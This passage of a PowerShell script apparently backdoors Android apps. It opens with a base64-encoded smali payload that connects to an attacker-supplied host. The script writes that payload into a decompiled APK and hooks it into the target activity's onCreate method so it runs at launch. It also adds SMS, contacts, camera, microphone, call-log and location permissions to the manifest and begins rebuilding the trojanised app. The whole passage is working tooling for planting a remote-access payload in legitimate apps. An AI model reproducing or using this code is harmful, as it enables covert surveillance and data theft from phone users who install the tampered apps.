ogICAgaW52b2tlLXZpcnR1YWwge3YzfSwgTGphdmEvbmV0L1NlcnZlclNvY2tldDstPmFjY2VwdCgpTGphdmEvbmV0L1NvY2tldDsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjQKCiAgICAubGluZSA5OAogICAgLmxvY2FsIHY0LCAic29jayI6TGphdmEvbmV0L1NvY2tldDsKICAgIGludm9rZS12aXJ0dWFsIHt2M30sIExqYXZhL25ldC9TZXJ2ZXJTb2NrZXQ7LT5jbG9zZSgpVgoKICAgIC5saW5lIDEwMgogICAgLmVuZCBsb2NhbCB2MyAgICAjICJzZXJ2ZXIiOkxqYXZhL25ldC9TZXJ2ZXJTb2NrZXQ7CiAgICA6Z290b18wCiAgICBpZi1lcXogdjQsIDpjb25kXzAKCiAgICAubGluZSAxMDMKICAgIGNvbnN0LzE2IHY1LCAweDFmNAoKICAgIGludm9rZS12aXJ0dWFsIHt2NCwgdjV9LCBMamF2YS9uZXQvU29ja2V0Oy0+c2V0U29UaW1lb3V0KEkpVgoKICAgIC5saW5lIDEwNAogICAgbmV3LWluc3RhbmNlIHY1LCBMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07CgogICAgaW52b2tlLXZpcnR1YWwge3Y0fSwgTGphdmEvbmV0L1NvY2tldDstPmdldElucHV0U3RyZWFtKClMamF2YS9pby9JbnB1dFN0cmVhbTsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjYKCiAgICBpbnZva2UtZGlyZWN0IHt2NSwgdjZ9LCBMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07LT48aW5pdD4oTGphdmEvaW8vSW5wdXRTdHJlYW07KVYKCiAgICBuZXctaW5zdGFuY2UgdjYsIExqYXZhL2lvL0RhdGFPdXRwdXRTdHJlYW07CgogICAgaW52b2tlLXZpcnR1YWwge3Y0fSwgTGphdmEvbmV0L1NvY2tldDstPmdldE91dHB1dFN0cmVhbSgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2NwoKICAgIGludm9rZS1kaXJlY3Qge3Y2LCB2N30sIExqYXZhL2lvL0RhdGFPdXRwdXRTdHJlYW07LT48aW5pdD4oTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWCgogICAgc2dldC1vYmplY3QgdjcsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+cGFyYW1ldGVyczpbTGphdmEvbGFuZy9TdHJpbmc7CgogICAgaW52b2tlLXN0YXRpYyB7djUsIHY2LCB2N30sIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+bGVlc0VuTG9vcERpZURpbmcoTGphdmEvaW8vRGF0YUlucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtbTGphdmEvbGFuZy9TdHJpbmc7KVYKCiAgICAubGluZSAxMDYKICAgIDpjb25kXzAKICAgIHJldHVybi12b2lkCgogICAgLmxpbmUgMTAwCiAgICAuZW5kIGxvY2FsIHY0ICAgICMgInNvY2siOkxqYXZhL25ldC9Tb2NrZXQ7CiAgICA6Y29uZF8xCiAgICBuZXctaW5zdGFuY2UgdjQsIExqYXZhL25ldC9Tb2NrZXQ7CgogICAgaW52b2tlLWRpcmVjdCB7djQsIHYxLCB2Mn0sIExqYXZhL25ldC9Tb2NrZXQ7LT48aW5pdD4oTGphdmEvbGFuZy9TdHJpbmc7SSlWCgogICAgLnJlc3RhcnQgbG9jYWwgdjQgICAgIyAic29jayI6TGphdmEvbmV0L1NvY2tldDsKICAgIGdvdG8gOmdvdG9fMAouZW5kIG1ldGhvZAoKLm1ldGhvZCBwdWJsaWMgc3RhdGljIG1haW4oW0xqYXZhL2xhbmcvU3RyaW5nOylWCiAgICAubG9jYWxzIDE2CiAgICAucGFyYW0gcDAsICJhcmdzIiAgICAjIFtMamF2YS9sYW5nL1N0cmluZzsKICAgIC5hbm5vdGF0aW9uIHN5c3RlbSBMZGFsdmlrL2Fubm90YXRpb24vVGhyb3dzOwogICAgICAgIHZhbHVlID0gewogICAgICAgICAgICBMamF2YS9sYW5nL0V4Y2VwdGlvbjsKICAgICAgICB9CiAgICAuZW5kIGFubm90YXRpb24KCiAgICAucHJvbG9ndWUKICAgIC5saW5lIDUxCiAgICBpZi1lcXogcDAsIDpjb25kXzAKCiAgICAubGluZSA1MgogICAgY29uc3QvNCB2MTIsIDB4MQoKICAgIG5ldy1hcnJheSB2MTIsIHYxMiwgW0xqYXZhL2xhbmcvU3RyaW5nOwoKICAgIGNvbnN0LzQgdjEzLCAweDAKCiAgICBuZXctaW5zdGFuY2UgdjE0LCBMamF2YS9pby9GaWxlOwoKICAgIGNvbnN0LXN0cmluZyB2MTUsICIuIgoKICAgIGludm9rZS1kaXJlY3Qge3YxNCwgdjE1fSwgTGphdmEvaW8vRmlsZTstPjxpbml0PihMamF2YS9sYW5nL1N0cmluZzspVgoKICAgIGludm9rZS12aXJ0dWFsIHt2MTR9LCBMamF2YS9pby9GaWxlOy0+Z2V0QWJzb2x1dGVQYXRoKClMamF2YS9sYW5nL1N0cmluZzsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjE0CgogICAgYXB1dC1vYmplY3QgdjE0LCB2MTIsIHYxMwoKICAgIHNwdXQtb2JqZWN0IHYxMiwgUExBQ0VIT0xERVIvQXNzaXN0QWN0aXZpdHk7LT5wYXJhbWV0ZXJzOltMamF2YS9sYW5nL1N0cmluZzsKCiAgICAubGluZSA1NAogICAgOmNvbmRfMAogICAgbmV3LWluc3RhbmNlIHYxMiwgTGphdmEvbGFuZy9TdHJpbmc7CgogICAgc2dldC1vYmplY3QgdjEzLCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPnRBcnI6W0IKCiAgICBpbnZva2UtZGlyZWN0IHt2MTIsIHYxM30sIExqYXZhL2xhbmcvU3RyaW5nOy0+PGluaXQ+KFtCKVYKCiAgICBjb25zdC80IHYxMywgMHg0CgogICAgaW52b2tlLXZpcnR1YWwge3YxMiwgdjEzfSwgTGphdmEvbGFuZy9TdHJpbmc7LT5zdWJzdHJpbmcoSSlMamF2YS9sYW5nL1N0cmluZzsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjEyCgogICAgaW52b2tlLXZpcnR1YWwge3YxMn0sIExqYXZhL2xhbmcvU3RyaW5nOy0+dHJpbSgpTGphdmEvbGFuZy9TdHJpbmc7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYxMgoKICAgIGNvbnN0LXN0cmluZyB2MTMsICItIgoKICAgIGludm9rZS12aXJ0dWFsIHt2MTIsIHYxM30sIExqYXZhL2xhbmcvU3RyaW5nOy0+c3BsaXQoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjMKCiAgICAubGluZSA1NwogICAgLmxvY2FsIHYzLCAidGltZW91dHMiOltMamF2YS9sYW5nL1N0cmluZzsKICAgIGNvbnN0LzQgdjEyLCAweDAKCiAgICA6dHJ5X3N0YXJ0XzAKICAgIGFnZXQtb2JqZWN0IHYxMiwgdjMsIHYxMgoKICAgIGludm9rZS1zdGF0aWMge3YxMn0sIExqYXZhL2xhbmcvSW50ZWdlcjstPnBhcnNlSW50KExqYXZhL2xhbmcvU3RyaW5nOylJCgogICAgbW92ZS1yZXN1bHQgdjEyCgogICAgaW50LXRvLWxvbmcgdjEwLCB2MTIKCiAgICAubGluZSA1OAogICAgLmxvY2FsIHYxMCwgInNlc3Npb25FeHBpcnkiOkoKICAgIGNvbnN0LzQgdjEyLCAweDEKCiAgICBhZ2V0LW9iamVjdCB2MTIsIHYzLCB2MTIKCiAgICBpbnZva2Utc3RhdGljIHt2MTJ9LCBMamF2YS9sYW5nL0ludGVnZXI7LT5wYXJzZUludChMamF2YS9sYW5nL1N0cmluZzspSQoKICAgIG1vdmUtcmVzdWx0IHYxMgoKICAgIGludC10by1sb25nIHYwLCB2MTIKCiAgICAubGluZSA1OQogICAgLmxvY2FsIHYwLCAiY29tbVRpbWVvdXQiOkoKICAgIGNvbnN0LzQgdjEyLCAweDIKCiAgICBhZ2V0LW9iamVjdCB2MTIsIHYzLCB2MTIKCiAgICBpbnZva2Utc3RhdGljIHt2MTJ9LCBMamF2YS9sYW5nL0ludGVnZXI7LT5wYXJzZUludChMamF2YS9sYW5nL1N0cmluZzspSQoKICAgIG1vdmUtcmVzdWx0IHYxMgoKICAgIGludC10by1sb25nIHY2LCB2MTIKCiAgICAubGluZSA2MAogICAgLmxvY2FsIHY2LCAicmV0cnlUb3RhbCI6SgogICAgY29uc3QvNCB2MTIsIDB4MwoKICAgIGFnZXQtb2JqZWN0IHYxMiwgdjMsIHYxMgoKICAgIGludm9rZS1zdGF0aWMge3YxMn0sIExqYXZhL2xhbmcvSW50ZWdlcjstPnBhcnNlSW50KExqYXZhL2xhbmcvU3RyaW5nOylJCgogICAgbW92ZS1yZXN1bHQgdjEyCgogICAgaW50LXRvLWxvbmcgdjgsIHYxMgoKICAgIC5saW5lIDYxCiAgICAubG9jYWwgdjgsICJyZXRyeVdhaXQiOkoKICAgIGludm9rZS1zdGF0aWMge30sIExqYXZhL2xhbmcvU3lzdGVtOy0+Y3VycmVudFRpbWVNaWxsaXMoKUoKCiAgICBtb3ZlLXJlc3VsdC13aWRlIHY0CgogICAgLmxpbmUgNjMKICAgIC5sb2NhbCB2NCwgInBheWxvYWRTdGFydCI6SgogICAgc2dldC1vYmplY3QgdjEyLCBMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7LT5TRUNPTkRTOkxqYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdDsKCiAgICBpbnZva2UtdmlydHVhbCB7djEyLCB2MTAsIHYxMX0sIExqYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdDstPnRvTWlsbGlzKEopSgoKICAgIG1vdmUtcmVzdWx0LXdpZGUgdjEyCgogICAgYWRkLWxvbmcvMmFkZHIgdjEyLCB2NAoKICAgIHNwdXQtd2lkZSB2MTIsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+d2hlblRoZVNlc3Npb25FeHBpcmVzOkoKCiAgICAubGluZSA2NAogICAgc2dldC1vYmplY3QgdjEyLCBMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7LT5TRUNPTkRTOkxqYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdDsKCiAgICBpbnZva2UtdmlydHVhbCB7djEyLCB2MCwgdjF9LCBMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7LT50b01pbGxpcyhKKUoKCiAgICBtb3ZlLXJlc3VsdC13aWRlIHYxMgoKICAgIHNwdXQtd2lkZSB2MTIsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+dGltZW91dE9mVGhlQ29ubjpKCgogICAgLmxpbmUgNjUKICAgIHNnZXQtb2JqZWN0IHYxMiwgTGphdmEvdXRpbC9jb25jdXJyZW50L1RpbWVVbml0Oy0+U0VDT05EUzpMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7CgogICAgaW52b2tlLXZpcnR1YWwge3YxMiwgdjYsIHY3fSwgTGphdmEvdXRpbC9jb25jdXJyZW50L1RpbWVVbml0Oy0+dG9NaWxsaXMoSilKCgogICAgbW92ZS1yZXN1bHQtd2lkZSB2MTIKCiAgICBzcHV0LXdpZGUgdjEyLCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPnJldHJ5X3RvdGFsOkoKCiAgICAubGluZSA2NgogICAgc2dldC1vYmplY3QgdjEyLCBMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7LT5TRUNPTkRTOkxqYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdDsKCiAgICBpbnZva2UtdmlydHVhbCB7djEyLCB2OCwgdjl9LCBMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7LT50b01pbGxpcyhKKUoKCiAgICBtb3ZlLXJlc3VsdC13aWRlIHYxMgoKICAgIHNwdXQtd2lkZSB2MTIsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+cmV0cnlfd2FpdDpKCgogICAgLmxpbmUgNjkKICAgIG5ldy1pbnN0YW5jZSB2MTIsIExqYXZhL2xhbmcvU3RyaW5nOwoKICAgIHNnZXQtb2JqZWN0IHYxMywgUExBQ0VIT0xERVIvQXNzaXN0QWN0aXZpdHk7LT5hcnJheTpbQgoKICAgIGludm9rZS1kaXJlY3Qge3YxMiwgdjEzfSwgTGphdmEvbGFuZy9TdHJpbmc7LT48aW5pdD4oW0IpVgoKICAgIGNvbnN0LzQgdjEzLCAweDQKCiAgICBpbnZva2UtdmlydHVhbCB7djEyLCB2MTN9LCBMamF2YS9sYW5nL1N0cmluZzstPnN1YnN0cmluZyhJKUxqYXZhL2xhbmcvU3RyaW5nOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MgoKICAgIC5saW5lIDcyCiAgICAubG9jYWwgdjIsICJkaWVQbGVrV2FhclRlR2FhbiI6TGphdmEvbGFuZy9TdHJpbmc7CiAgICBpbnZva2Utc3RhdGljIHt9LCBMamF2YS9sYW5nL1N5c3RlbTstPmN1cnJlbnRUaW1lTWlsbGlzKClKCgogICAgbW92ZS1yZXN1bHQtd2lkZSB2MTIKCiAgICBzZ2V0LXdpZGUgdjE0LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPnJldHJ5X3RvdGFsOkoKCiAgICBhZGQtbG9uZy8yYWRkciB2MTQsIHY0CgogICAgY21wLWxvbmcgdjEyLCB2MTIsIHYxNAoKICAgIGlmLWdleiB2MTIsIDpjb25kXzEKCiAgICBpbnZva2Utc3RhdGljIHt9LCBMamF2YS9sYW5nL1N5c3RlbTstPmN1cnJlbnRUaW1lTWlsbGlzKClKCgogICAgbW92ZS1yZXN1bHQtd2lkZSB2MTIKCiAgICBzZ2V0LXdpZGUgdjE0LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPndoZW5UaGVTZXNzaW9uRXhwaXJlczpKCgogICAgY21wLWxvbmcgdjEyLCB2MTIsIHYxNAoKICAgIGlmLWdleiB2MTIsIDpjb25kXzEKCiAgICAubGluZSA4MgogICAgY29uc3Qtc3RyaW5nIHYxMiwgInRjcCIKCiAgICBpbnZva2UtdmlydHVhbCB7djIsIHYxMn0sIExqYXZhL2xhbmcvU3RyaW5nOy0+c3RhcnRzV2l0aChMamF2YS9sYW5nL1N0cmluZzspWgoKICAgIG1vdmUtcmVzdWx0IHYxMgoKICAgIGlmLWVxeiB2MTIsIDpjb25kXzEKCiAgICAubGluZSA4MwogICAgaW52b2tlLXN0YXRpYyB7djJ9LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPm1hYWtEaWVTdGFnZVZhblRjcChMamF2YS9sYW5nL1N0cmluZzspVgogICAgOnRyeV9lbmRfMAogICAgLmNhdGNoIExqYXZhL2xhbmcvTnVtYmVyRm9ybWF0RXhjZXB0aW9uOyB7OnRyeV9zdGFydF8wIC4uIDp0cnlfZW5kXzB9IDpjYXRjaF8wCgogICAgLmxpbmUgODgKICAgIC5lbmQgbG9jYWwgdjAgICAgIyAiY29tbVRpbWVvdXQiOkoKICAgIC5lbmQgbG9jYWwgdjIgICAgIyAiZGllUGxla1dhYXJUZUdhYW4iOkxqYXZhL2xhbmcvU3RyaW5nOwogICAgLmVuZCBsb2NhbCB2NCAgICAjICJwYXlsb2FkU3RhcnQiOkoKICAgIC5lbmQgbG9jYWwgdjYgICAgIyAicmV0cnlUb3RhbCI6SgogICAgLmVuZCBsb2NhbCB2OCAgICAjICJyZXRyeVdhaXQiOkoKICAgIC5lbmQgbG9jYWwgdjEwICAgICMgInNlc3Npb25FeHBpcnkiOkoKICAgIDpjb25kXzEKICAgIDpnb3RvXzAKICAgIHJldHVybi12b2lkCgogICAgLmxpbmUgODYKICAgIDpjYXRjaF8wCiAgICBtb3ZlLWV4Y2VwdGlvbiB2MTIKCiAgICBnb3RvIDpnb3RvXzAKLmVuZCBtZXRob2QKCi5tZXRob2QgcHVibGljIHN0YXRpYyBwYXRoVG9TdGFydEluKExqYXZhL2xhbmcvU3RyaW5nOylWCiAgICAubG9jYWxzIDIKICAgIC5wYXJhbSBwMCwgInBhdGgiICAgICMgTGphdmEvbGFuZy9TdHJpbmc7CgogICAgLnByb2xvZ3VlCiAgICAubGluZSA0NgogICAgY29uc3QvNCB2MCwgMHgxCgogICAgbmV3LWFycmF5IHYwLCB2MCwgW0xqYXZhL2xhbmcvU3RyaW5nOwoKICAgIGNvbnN0LzQgdjEsIDB4MAoKICAgIGFwdXQtb2JqZWN0IHAwLCB2MCwgdjEKCiAgICBzcHV0LW9iamVjdCB2MCwgUExBQ0VIT0xERVIvQXNzaXN0QWN0aXZpdHk7LT5wYXJhbWV0ZXJzOltMamF2YS9sYW5nL1N0cmluZzsKCiAgICAubGluZSA0NwogICAgaW52b2tlLXN0YXRpYyB7fSwgUExBQ0VIT0xERVIvQXNzaXN0QWN0aXZpdHk7LT5zdGFydEFzeW5jKClWCgogICAgLmxpbmUgNDgKICAgIHJldHVybi12b2lkCi5lbmQgbWV0aG9kCgoubWV0aG9kIHB1YmxpYyBzdGF0aWMgc3RhcnRBc3luYygpVgogICAgLmxvY2FscyAxCgogICAgLnByb2xvZ3VlCiAgICAubGluZSAzNAogICAgbmV3LWluc3RhbmNlIHYwLCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTE7CgogICAgaW52b2tlLWRpcmVjdCB7djB9LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTE7LT48aW5pdD4oKVYKCiAgICBpbnZva2UtdmlydHVhbCB7djB9LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTE7LT5zdGFydCgpVgoKICAgIC5saW5lIDQzCiAgICByZXR1cm4tdm9pZAouZW5kIG1ldGhvZAo='))

		$ActivityFile = $TargetActivity.Remove(0, $TargetActivity.LastIndexOf('.') + 1) + '.smali'
		$ActivityFolder = $TargetActivity.Replace('.', '/').Remove($TargetActivity.LastIndexOf('.'))
		$InjectActivityFolder = "L$ActivityFolder"
	}
	
	PROCESS
	{
		$Payload1 = $Payload1.Replace('PLACEHOLDER', $InjectActivityFolder)
		$Payload2 = $Payload2.Replace('PLACEHOLDER', $InjectActivityFolder)
		
		$Payload2 = $Payload2.Replace('SRVHOST', $HexHost.Trim())
        $Payload2 = $Payload2.Replace('HEXLENGTH', $HexHostLength)
        #Join-Path "$DecompiledApk\smali" $ActivityFolder
        
        try {
			$TargetFile = New-Object IO.FileInfo (Join-Path (Join-Path "$DecompiledApk\smali" $ActivityFolder) $ActivityFile -Resolve -ErrorAction SilentlyContinue) -ErrorAction SilentlyContinue
		} catch {}
		
		if (-Not $TargetFile) {
			Write-Result "[!] Couldn't find target activity folder" Warning
#			Write-Result "[!] Couldn't find target activity folder" Error
#			break
			try {
				Write-Command "find target_activity --recursive"
				$Path = Resolve-Path "$DecompiledApk\smali_*\$ActivityFolder\$ActivityFile"
				$TargetFile = New-Object IO.FileInfo $Path.Path
			} catch {}
			
			if (-Not $TargetFile) {
				Write-Result "[!] Definitely couldn't find target activity folder" Error
				break
			}
		}
		
		$TargetDirectory = @($TargetFile)[0].Directory

		Write-Result "[+] Target activity folder: $TargetDirectory"

		$Script:PathPayload1 = Join-Path $TargetDirectory 'AssistActivity1.smali'
		$Script:PathPayload2 = Join-Path $TargetDirectory 'AssistActivity.smali'

		[IO.File]::WriteAllText($PathPayload1, $Payload1)
		[IO.File]::WriteAllText($PathPayload2, $Payload2)

#		Write-Host "[*] PAYLOAD 1 WRITED TO: $PathPayload1"
#		Write-Host "[*] PAYLOAD 2 WRITED TO: $PathPayload2"
	}
	
	END
	{
		return New-Object PSObject -Property @{
			File = $TargetFile
			Folder = $ActivityFolder
		}
	}
}

Function Write-ApkHook {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[ValidateScript({
			if ($_.File -and $_.Folder) {
				$True
			} else {
				$False
			}
		})]
		[PSObject] $ActivityInfo,
		
		[Parameter(Mandatory = $True, Position = 1)]
		[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
		[String] $DecompiledApk,
		
		[Parameter(Mandatory = $False, Position = 2)]
		[String] $Payload = "`n`tinvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V`n"
	)

	BEGIN
	{
		#Write-Host "`n[*] Injecting hook into target activity..."
		Write-Command "inject hook"
	}

	PROCESS
	{
		#$InjectActivityFolder = "L" + $ActivityFolder
		$InjectPayload = $Payload.Replace('INJECT', 'L' + $ActivityInfo.Folder)
		$ActivityContent = [IO.File]::ReadAllLines($ActivityInfo.File.FullName)

		$Script:BackupActivityContent = $ActivityContent
		
		# Check if this file contains the onCreate method
		$Flag = ($ActivityContent | Out-String) -like "*`n.method * onCreate*"
		if (!$flag) {
			Write-Host "[!] Couldn't find onCreate method"
			# Search for the .super reference
			foreach ($Line in $ActivityContent) {
				if ($Line.StartsWith('.super')) {
					$NewActivityFile = $Line.Replace('.super L', '').Replace(';', '')
					$NewActivityPath = Resolve-Path "$DecompiledApk\*\$NewActivityFile.smali"
					$ActivityContent = [IO.File]::ReadAllLines($NewActivityPath.Path)
					break
				}
			}
		}
		
		$PayloadInjected = $False
		[String[]] $NewActivityContent = ''
		
		foreach ($Line in $ActivityContent) {
			$NewActivityContent += $Line
			if ($Line.Contains('method') -and $Line.Contains('onCreate')) {
				$Index = ($ActivityContent | Out-String).IndexOf($Line) + $Line.Length
				$NewActivityContent = ($NewActivityContent | Out-String) + $InjectPayload + ($ActivityContent | Out-String).Remove(0, $Index)
				$PayloadInjected = $True
				break
			}
		}
	}

	END
	{
		if ($PayloadInjected) {
			[IO.File]::WriteAllLines($ActivityInfo.File, $NewActivityContent.Trim())
		} else {
			Write-Result "[!] Couldn't inject hook payload" Error
			break
		}
	}
}

Function Get-Permissions {
	[CmdletBinding(DefaultParametersetName='All')]
	Param (
		[Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'All')]
		[Switch] $All,
		
		[Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'Normal')]
		[Switch] $Normal,
		
		[Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'Dangerous')]
		[Switch] $Dangerous
	)
#region Permissions
	$Permissions = @(
		@{
			String = 'ACCESS_COARSE_LOCATION'
			Dangerous = $True
		},
		@{
			String = 'ACCESS_FINE_LOCATION'
			Dangerous = $True
		},
		@{
			String = 'ACCESS_LOCATION_EXTRA_COMMANDS'
			Dangerous = $False
		},
		@{
			String = 'ACCESS_NETWORK_STATE'
			Dangerous = $False
		},
		@{
			String = 'ACCESS_NOTIFICATION_POLICY'
			Dangerous = $False
		},
		@{
			String = 'ACCESS_WIFI_STATE'
			Dangerous = $False
		},
		@{
			String = 'ADD_VOICEMAIL'
			Dangerous = $True
		},
		@{
			String = 'ANSWER_PHONE_CALLS'
			Dangerous = $True
		},
		@{
			String = 'BLUETOOTH'
			Dangerous = $False
		},
		@{
			String = 'BLUETOOTH_ADMIN'
			Dangerous = $False
		},
		@{
			String = 'BODY_SENSORS'
			Dangerous = $True
		},
		@{
			String = 'BROADCAST_STICKY'
			Dangerous = $False
		},
		@{
			String = 'CALL_PHONE'
			Dangerous = $True
		},
		@{
			String = 'CAMERA'
			Dangerous = $True
		},
		@{
			String = 'CHANGE_NETWORK_STATE'
			Dangerous = $False
		},
		@{
			String = 'CHANGE_WIFI_MULTICAST_STATE'
			Dangerous = $False
		},
		@{
			String = 'CHANGE_WIFI_STATE'
			Dangerous = $False
		},
		@{
			String = 'DISABLE_KEYGUARD'
			Dangerous = $False
		},
		@{
			String = 'EXPAND_STATUS_BAR'
			Dangerous = $False
		},
		@{
			String = 'GET_ACCOUNTS'
			Dangerous = $True
		},
		@{
			String = 'GET_PACKAGE_SIZE'
			Dangerous = $False
		},
		@{
			String = 'INSTALL_SHORTCUT'
			Dangerous = $False
		},
		@{
			String = 'INTERNET'
			Dangerous = $False
		},
		@{
			String = 'KILL_BACKGROUND_PROCESSES'
			Dangerous = $False
		},
		@{
			String = 'MANAGE_OWN_CALLS'
			Dangerous = $False
		},
		@{
			String = 'MODIFY_AUDIO_SETTINGS'
			Dangerous = $False
		},
		@{
			String = 'NFC'
			Dangerous = $False
		},
		@{
			String = 'READ_CALENDAR'
			Dangerous = $True
		},
		@{
			String = 'READ_CALL_LOG'
			Dangerous = $True
		},
		@{
			String = 'READ_CONTACTS'
			Dangerous = $True
		},
		@{
			String = 'READ_EXTERNAL_STORAGE'
			Dangerous = $True
		},
		@{
			String = 'READ_PHONE_NUMBERS'
			Dangerous = $True
		},
		@{
			String = 'READ_PHONE_STATE'
			Dangerous = $True
		},
		@{
			String = 'READ_SMS'
			Dangerous = $True
		},
		@{
			String = 'READ_SYNC_SETTINGS'
			Dangerous = $False
		},
		@{
			String = 'READ_SYNC_STATS'
			Dangerous = $False
		},
		@{
			String = 'RECEIVE_BOOT_COMPLETED'
			Dangerous = $False
		},
		@{
			String = 'RECEIVE_MMS'
			Dangerous = $True
		},
		@{
			String = 'RECEIVE_SMS'
			Dangerous = $True
		},
		@{
			String = 'RECEIVE_WAP_PUSH'
			Dangerous = $True
		},
		@{
			String = 'RECORD_AUDIO'
			Dangerous = $True
		},
		@{
			String = 'REORDER_TASKS'
			Dangerous = $False
		},
		@{
			String = 'REQUEST_COMPANION_RUN_IN_BACKGROUND'
			Dangerous = $False
		},
		@{
			String = 'REQUEST_COMPANION_USE_DATA_IN_BACKGROUND'
			Dangerous = $False
		},
		@{
			String = 'REQUEST_DELETE_PACKAGES'
			Dangerous = $False
		},
		@{
			String = 'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'
			Dangerous = $False
		},
		@{
			String = 'SEND_SMS'
			Dangerous = $True
		},
		@{
			String = 'SET_ALARM'
			Dangerous = $False
		},
		@{
			String = 'SET_WALLPAPER'
			Dangerous = $False
		},
		@{
			String = 'SET_WALLPAPER_HINTS'
			Dangerous = $False
		},
		@{
			String = 'TRANSMIT_IR'
			Dangerous = $False
		},
		@{
			String = 'USE_FINGERPRINT'
			Dangerous = $False
		},
		@{
			String = 'USE_SIP'
			Dangerous = $True
		},
		@{
			String = 'VIBRATE'
			Dangerous = $False
		},
		@{
			String = 'WAKE_LOCK'
			Dangerous = $False
		},
		@{
			String = 'WRITE_CALENDAR'
			Dangerous = $True
		},
		@{
			String = 'WRITE_CALL_LOG'
			Dangerous = $True
		},
		@{
			String = 'WRITE_CONTACTS'
			Dangerous = $True
		},
		@{
			String = 'WRITE_EXTERNAL_STORAGE'
			Dangerous = $True
		},
		@{
			String = 'WRITE_SYNC_SETTINGS'
			Dangerous = $False
		}			
	)
#endregion

	if ($PSBoundParameters['Normal']) {
	
		$($Permissions | ? {!$_.Dangerous}).String
		
	} elseif ($PSBoundParameters['Dangerous']) {
	
		$($Permissions | ? {$_.Dangerous}).String
	
	} else {
		
		$Permissions.String
		
	}
}

Function Write-Permissions {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
		[String] $DecompiledApk,
		
		[Parameter(Mandatory = $False, Position = 1)]
		[ValidateSet('Recommended', 'Dangerous', 'All')]
		[String] $Permissions = 'Recommended'
	)

	BEGIN
	{
		Switch ($Permissions) {
			'Recommended' {
				$ApkPermissions = @('INTERNET', 'ACCESS_NETWORK_STATE', 'ACCESS_COURSE_LOCATION', 'ACCESS_FINE_LOCATION', 'READ_PHONE_STATE', 'SEND_SMS', 'RECEIVE_SMS', 'CALL_PHONE', 'READ_CONTACTS', 'WRITE_CONTACTS', 'RECORD_AUDIO', 'WRITE_SETTINGS', 'CAMERA', 'READ_SMS', 'READ_CALL_LOG')
				break
			}
			
			'Dangerous' {
				$ApkPermissions = Get-Permissions -Dangerous
				break
			}
			
			'All' {
				$ApkPermissions = Get-Permissions -All
				break
			}
		}
		
		#Write-Host "[*] Injecting $($Permissions.ToLower()) permissions"
		Write-Command "inject $($Permissions.ToLower())_permissions"
		$AndroidManifestPath = "$DecompiledApk\AndroidManifest.xml"
	}

	PROCESS
	{
		$AndroidManifest = [IO.File]::ReadAllText($AndroidManifestPath)
		$Script:BackupManifest = $AndroidManifest
		
		$NewPermissions = ''
		foreach ($Permission in $ApkPermissions) {
			$PermissionConstant = 'android.permission.' + $Permission
			$Permission = '<uses-permission android:name="' + $PermissionConstant + '" />' + "`n    "
			
			if (-Not $AndroidManifest.Contains($PermissionConstant.Trim())) {
				$NewPermissions += $Permission
			}
		}

		$Index = $AndroidManifest.IndexOf('uses-permission') - 1
		$NewAndroidManifest = $AndroidManifest.Remove($Index) + $NewPermissions + $AndroidManifest.Remove(0, $Index)

		[IO.File]::WriteAllText($AndroidManifestPath, $NewAndroidManifest)
	}
}

Function Build-Apk {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
		[String] $DecompiledApk,
		
		[Parameter(Mandatory = $True, Position = 1)]
		[String] $Name,
		
		[Parameter(Mandatory = $False, Position = 2)]
		[Switch] $Force
	)

	BEGIN
	{
		if (-Not $Name.EndsWith('.apk')) {
			$Name += '.apk'
		}
	
		#Write-Host "`n[*] Building Apk..."
		Write-Command rebuild

		$PathToNewApk = "$DecompiledApk\dist\" + $Name
		$Command = "b $DecompiledApk"
